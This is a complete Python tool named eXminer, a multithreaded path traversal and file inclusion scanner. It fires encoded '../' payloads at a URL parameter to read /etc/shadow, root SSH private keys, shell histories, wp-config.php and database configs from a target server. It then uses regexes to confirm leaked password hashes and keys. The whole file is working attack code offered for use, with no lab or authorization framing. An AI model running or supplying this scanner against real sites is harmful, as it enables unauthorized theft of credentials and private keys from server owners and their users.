#!/usr/bin/env python3
import requests
import sys
import re
import os
from termcolor import colored
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlparse
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


class Exminer:
    def __init__(self, target, threads=10, timeout=5, verbose=False):
        self.target = target
        self.threads = threads
        self.timeout = timeout
        self.verbose = verbose
        self.headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
        self.executor = None

        self.proofs = {
            "passwd": r"root:x:0:0:",
            "shadow": r"root:\$([0-9a-z]+)\$",
            "win.ini": r"\[extensions\]|\[fonts\]",
            "id_rsa": r"-----BEGIN (RSA|OPENSSH) PRIVATE KEY-----",
            "history": r"[a-z0-9]+@|history|sh -c",
            "issue": r"Ubuntu|Debian|Linux|CentOS|Red Hat",
            "config": r"<\?php|DB_PASSWORD|DB_USER|password_res",
            "version": r"Linux version|gcc version"
        }

        self.files = {
            "SYSTEM -> ": ["/etc/passwd", "/etc/group", "/etc/issue", "/etc/hostname", "/proc/version","/windows/win.ini"],
            "SECURITY -> ": ["/etc/shadow", "/root/.ssh/id_rsa", "/root/.ssh/authorized_keys", "/home/*/.ssh/id_rsa"],
            "HISTORY -> ": ["/root/.bash_history", "/home/*/.bash_history", "/home/*/.zsh_history"],
            "LOG -> ": ["/var/log/apache2/access.log", "/var/log/nginx/access.log", "/var/log/auth.log"],
            "WEB -> ": ["/var/www/html/config.php", "/var/www/html/wp-config.php", "/etc/apache2/apache2.conf"],
            "DATABASE -> ": ["/etc/mysql/my.cnf", "/etc/my.cnf"]
        }

        self.traversal_techniques = ["../" * 12, "..%2f" * 12, "..%252f" * 12, "..../" * 12, "..;/" * 12]
        self.found_files = []
        self.critical_files = []

    def validate_url(self):
        try:
            parsed = urlparse(self.target)
            return bool(parsed.scheme and '=' in self.target)
        except:
            return False

    def test_file(self, category, filepath, technique):
        try:
            payload = technique + filepath.lstrip("/")
            test_url = self.target + payload
            r = requests.get(test_url, headers=self.headers, timeout=self.timeout, allow_redirects=False, verify=False)

            if r.status_code == 200 and len(r.text) > 20:
                content = r.text
                bad_words = ["sql syntax", "mysql_fetch", "error in your sql", "warning: fopen",
                             "failed to open stream", "no such file"]
                if any(word in content.lower() for word in bad_words):
                    return None

                is_verified = False
                for key, pattern in self.proofs.items():
                    if key in filepath.lower():
                        if re.search(pattern, content, re.IGNORECASE):
                            is_verified = True
                            break

                if filepath in content and not is_verified:
                    return None

                critical_indicators = ["root:", "BEGIN RSA", "BEGIN DSA", "ssh-rsa", "password", "Linux version"]
                is_critical = is_verified or any(ind in content for ind in critical_indicators)

                result = {
                    'category': category, 'file': filepath, 'url': test_url,
                    'critical': is_critical, 'technique': technique, 'size': len(r.text)
                }

                if is_critical:
                    self.critical_files.append(result)
                else:
                    self.found_files.append(result)
                return result
            return None
        except:
            return None

    def scan(self):
        if not self.validate_url():
            print(colored("ERROR: Invalid URL. Use -h for help.", "red"))
            return

        tasks = [(cat, path, tech) for cat, paths in self.files.items() for path in paths for tech in
                 self.traversal_techniques]

        print(colored(f"\n           TESTING {len(tasks)} COMBINATIONS..", "blue"))
        print(f"{colored('─' * 50, 'blue')}\n")


        self.executor = ThreadPoolExecutor(max_workers=self.threads)
        try:
            futures = {self.executor.submit(self.test_file, c, p, t): (c, p) for c, p, t in tasks}
            for future in as_completed(futures):
                res = future.result()
                if res:
                    mark = colored("[!]", "red", attrs=["bold"]) if res['critical'] else colored("[+]", "green")
                    print(f"{mark} {res['category']:<10} {res['file']}")

            self.print_summary()

        except KeyboardInterrupt:
            print(colored("\n\n[!] CTRL+C detected. Cleaning up threads...", "red"))
            self.executor.shutdown(wait=False, cancel_futures=True)
            os._exit(0)

    def print_summary(self):
        total = len(self.found_files) + len(self.critical_files)
        if total == 0:
            print(colored("             NO VALID FILES FOUND", "yellow"))
        else:
            print(colored(f"\nRESULT: {len(self.critical_files)} CRITICAL | {len(self.found_files)} FOUND", "green"))
            filename = "exminer_results.txt"
            print("\n" + colored("─" * 50, "blue"))

            with open(filename, 'w', encoding='utf-8') as f:
                f.write(colored(f"\nEXMINER REPORT - {self.target}\n", "yellow"))
                f.write(colored("-" * 60 + "\n", "dark_grey"))
                for item in self.critical_files + self.found_files:
                    f.write(colored(f"FOUND: {item['file']}\n", "cyan"))
                    f.write(f"PAYLOAD: {item['url']}\n")
                    f.write(colored("-" * 20 + "\n", "dark_grey"))
                f.write(colored(f"\nTotal: {total} files extracted.\n", "green"))
                f.write(colored(f"\n[!] If You Can't See Any Content in Website Try: curl -i -s 'URL'\n", "blue"))
                f.write(colored("\neXminer | (github.com/7nihil)", "red"))
            print(colored(f"SAVED → {filename}", "yellow"))


def print_help():
    banner = colored(
        r"""               __  __          _                 
            ___\ \/ /_ __ ___ (_)_ __   ___ _ __ 
           / _ \\  /| '_ ` _ \| | '_ \ / _ \ '__|
          |  __//  \| | | | | | | | | |  __/ |   
           \___/_/\_\_| |_| |_|_|_| |_|\___|_|  

                """, "dark_grey")
    print(f"\n{banner}")
    print(colored("GitHub:", 'cyan') + " github.com/7nihil")
    print(colored("Contact:", 'cyan') + " nihil7sec@gmail.com")
    print()
    print(colored("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n", "dark_grey"))
    print(colored("Usage: ", "dark_grey", attrs=["bold"]) + "exminer -u 'http://website.com/view.php?file='")
    print()
    print(colored("Options:", "dark_grey", attrs=["bold"]))
    print("  -u, --url        Target URL With Parameter")
    print("  -t, --threads    Thread Number (Default: 10)")
    print("  -h, --help       Show Help Message")
    print("  --timeout        Request Timeout in Seconds (Default: 5)")
    print()


if __name__ == "__main__":
    try:
        args = sys.argv
        if len(args) == 1 or '-h' in args or '--help' in args:
            print_help()
        else:
            url_idx = args.index('-u') if '-u' in args else args.index('--url')
            target_url = args[url_idx + 1]
            finder = Exminer(target=target_url, threads=10, timeout=5)
            finder.scan()
    except KeyboardInterrupt:
        print(colored("\n\n[!] CTRL+C detected. Force exiting...", "red"))
        os._exit(0)